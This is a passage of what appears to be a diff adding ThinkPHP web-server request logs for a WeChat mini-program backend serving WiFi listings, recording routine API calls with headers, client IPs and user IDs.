+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'upgrade-insecure-requests' => '1',
+  'sec-gpc' => '1',
+  'dnt' => '1',
+  'connection' => 'keep-alive',
+  'cache-control' => 'max-age=0',
+  'accept-language' => 'en;q=0.9',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
+  'host' => 'www.jiajiazxgg.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T20:10:36+08:00 ] 172.17.142.12 106.119.2.206 POST /index.php/handle/Xcx/getUserInfo
+[ info ] www.jiajiazxgg.com/index.php/handle/Xcx/getUserInfo [运行时间：0.053420s][吞吐率：18.72req/s] [内存消耗：2,175.22kb] [文件加载：46]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Xcx',
+    2 => 'getUserInfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; V1916A Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/2192 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/ Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '11',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'id' => 2625,
+)
+[ info ] [ RUN ] app\handle\controller\Xcx->getUserInfo[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Xcx.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T20:10:36+08:00 ] 172.17.142.12 106.119.2.206 POST /index.php/handle/Wifi/wxapplist
+[ info ] www.jiajiazxgg.com/index.php/handle/Wifi/wxapplist [运行时间：0.047742s][吞吐率：20.95req/s] [内存消耗：2,448.63kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Wifi',
+    2 => 'wxapplist',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; V1916A Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/2192 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/ Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '2',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\handle\controller\Wifi->wxapplist[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Wifi.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T20:11:36+08:00 ] 172.17.142.12 106.119.2.206 POST /index.php/handle/Xcx/getUserInfo
+[ info ] www.jiajiazxgg.com/index.php/handle/Xcx/getUserInfo [运行时间：0.027113s][吞吐率：36.88req/s] [内存消耗：2,175.22kb] [文件加载：46]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Xcx',
+    2 => 'getUserInfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; V1916A Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/2192 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/ Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '11',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'id' => 2625,
+)
+[ info ] [ RUN ] app\handle\controller\Xcx->getUserInfo[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Xcx.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T20:11:57+08:00 ] 172.17.142.12 106.119.2.206 POST /index.php/handle/Xcx/getUserInfo
+[ info ] www.jiajiazxgg.com/index.php/handle/Xcx/getUserInfo [运行时间：0.029339s][吞吐率：34.08req/s] [内存消耗：2,175.22kb] [文件加载：46]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Xcx',
+    2 => 'getUserInfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; V1916A Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/2192 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/ Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '11',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'id' => 2625,
+)
+[ info ] [ RUN ] app\handle\controller\Xcx->getUserInfo[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Xcx.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T20:12:39+08:00 ] 172.17.142.12 182.51.86.39 POST /index.php/handle/Xcx/getUserInfo
+[ info ] www.jiajiazxgg.com/index.php/handle/Xcx/getUserInfo [运行时间：0.045973s][吞吐率：21.75req/s] [内存消耗：2,175.22kb] [文件加载：46]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Xcx',
+    2 => 'getUserInfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; PDAM10 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/8848 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '11',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'id' => 2645,
+)
+[ info ] [ RUN ] app\handle\controller\Xcx->getUserInfo[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Xcx.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T20:12:39+08:00 ] 172.17.142.12 182.51.86.39 POST /index.php/handle/Wifi/wxapplist
+[ info ] www.jiajiazxgg.com/index.php/handle/Wifi/wxapplist [运行时间：0.079037s][吞吐率：12.65req/s] [内存消耗：2,448.63kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Wifi',
+    2 => 'wxapplist',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; PDAM10 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/8848 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '2',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\handle\controller\Wifi->wxapplist[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Wifi.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T20:12:39+08:00 ] 172.17.142.12 182.51.86.39 POST /index.php/handle/Xcx/getUserInfo
+[ info ] www.jiajiazxgg.com/index.php/handle/Xcx/getUserInfo [运行时间：0.030849s][吞吐率：32.42req/s] [内存消耗：2,175.22kb] [文件加载：46]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Xcx',
+    2 => 'getUserInfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; PDAM10 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/8848 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '11',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'id' => 2645,
+)
+[ info ] [ RUN ] app\handle\controller\Xcx->getUserInfo[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Xcx.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T20:13:17+08:00 ] 172.17.142.12 182.51.86.39 POST /index.php/handle/Xcx/getUserInfo
+[ info ] www.jiajiazxgg.com/index.php/handle/Xcx/getUserInfo [运行时间：0.028440s][吞吐率：35.16req/s] [内存消耗：2,175.22kb] [文件加载：46]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Xcx',
+    2 => 'getUserInfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; V1916A Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/2192 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/ Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '11',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'id' => 2625,
+)
+[ info ] [ RUN ] app\handle\controller\Xcx->getUserInfo[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Xcx.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T20:29:12+08:00 ] 172.17.142.12 39.144.50.11 POST /index.php/handle/Wifi/wxapplist
+[ info ] www.jiajiazxgg.com/index.php/handle/Wifi/wxapplist [运行时间：0.048491s][吞吐率：20.62req/s] [内存消耗：2,448.63kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Wifi',
+    2 => 'wxapplist',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 13; V2154A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/6276 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '2',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\handle\controller\Wifi->wxapplist[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Wifi.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T20:29:12+08:00 ] 172.17.142.12 39.144.50.11 POST /index.php/handle/wifi/wifi_xiangqing
+[ info ] www.jiajiazxgg.com/index.php/handle/wifi/wifi_xiangqing [运行时间：0.070515s][吞吐率：14.18req/s] [内存消耗：2,462.03kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'wifi',
+    2 => 'wifi_xiangqing',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 13; V2154A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/6276 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '11',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'id' => '37',
+)
+[ info ] [ RUN ] app\handle\controller\Wifi->wifi_xiangqing[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Wifi.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T20:29:12+08:00 ] 172.17.142.12 39.144.50.11 POST /index.php/handle/Xcx/get_openid
+[ info ] www.jiajiazxgg.com/index.php/handle/Xcx/get_openid [运行时间：0.232003s][吞吐率：4.31req/s] [内存消耗：1,549.98kb] [文件加载：40]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Xcx',
+    2 => 'get_openid',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 13; V2154A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/6276 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '43',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'code' => '011F0lFa1huQLE0kSmFa17g4D62F0lFf',
+)
+[ info ] [ RUN ] app\handle\controller\Xcx->get_openid[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Xcx.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T20:29:40+08:00 ] 172.17.142.12 121.19.241.201 POST /index.php/handle/wifi/wifi_xiangqing
+[ info ] www.jiajiazxgg.com/index.php/handle/wifi/wifi_xiangqing [运行时间：0.034932s][吞吐率：28.63req/s] [内存消耗：2,461.66kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'wifi',
+    2 => 'wifi_xiangqing',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.32(0x18002032) NetType/WIFI Language/zh_CN',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'content-length' => '11',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'id' => '35',
+)
+[ info ] [ RUN ] app\handle\controller\Wifi->wifi_xiangqing[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Wifi.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T20:29:40+08:00 ] 172.17.142.12 121.19.241.201 POST /index.php/handle/Wifi/wxapplist
+[ info ] www.jiajiazxgg.com/index.php/handle/Wifi/wxapplist [运行时间：0.050624s][吞吐率：19.75req/s] [内存消耗：2,447.84kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Wifi',
+    2 => 'wxapplist',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.32(0x18002032) NetType/WIFI Language/zh_CN',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'content-length' => '2',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\handle\controller\Wifi->wxapplist[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Wifi.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T20:29:40+08:00 ] 172.17.142.12 121.19.241.201 POST /index.php/handle/Xcx/get_openid
+[ info ] www.jiajiazxgg.com/index.php/handle/Xcx/get_openid [运行时间：0.307855s][吞吐率：3.25req/s] [内存消耗：1,549.70kb] [文件加载：40]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Xcx',
+    2 => 'get_openid',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.32(0x18002032) NetType/WIFI Language/zh_CN',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'content-length' => '43',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'code' => '043SPz000OQHrP1WIK2008v3aF3SPz0I',
+)
+[ info ] [ RUN ] app\handle\controller\Xcx->get_openid[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Xcx.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T20:50:24+08:00 ] 172.17.142.12 141.98.10.56 GET /
+[ info ] 39.106.3.107:443/ [运行时间：0.019649s][吞吐率：50.89req/s] [内存消耗：1,719.67kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Hello World',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T21:25:49+08:00 ] 172.17.142.12 36.44.139.233 POST /index.php/handle/Xcx/getUserInfo
+[ info ] www.jiajiazxgg.com/index.php/handle/Xcx/getUserInfo [运行时间：0.075861s][吞吐率：13.18req/s] [内存消耗：2,175.22kb] [文件加载：46]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Xcx',
+    2 => 'getUserInfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; M2007J17C Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/7811 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '11',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'id' => 3157,
+)
+[ info ] [ RUN ] app\handle\controller\Xcx->getUserInfo[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Xcx.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T21:25:49+08:00 ] 172.17.142.12 36.44.139.233 POST /index.php/handle/Wifi/wxapplist
+[ info ] www.jiajiazxgg.com/index.php/handle/Wifi/wxapplist [运行时间：0.078137s][吞吐率：12.80req/s] [内存消耗：2,448.63kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Wifi',
+    2 => 'wxapplist',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; M2007J17C Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/7811 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '2',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\handle\controller\Wifi->wxapplist[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Wifi.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T21:26:25+08:00 ] 172.17.142.12 36.44.139.233 POST /index.php/handle/Xcx/getUserInfo
+[ info ] www.jiajiazxgg.com/index.php/handle/Xcx/getUserInfo [运行时间：0.030784s][吞吐率：32.48req/s] [内存消耗：2,175.22kb] [文件加载：46]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
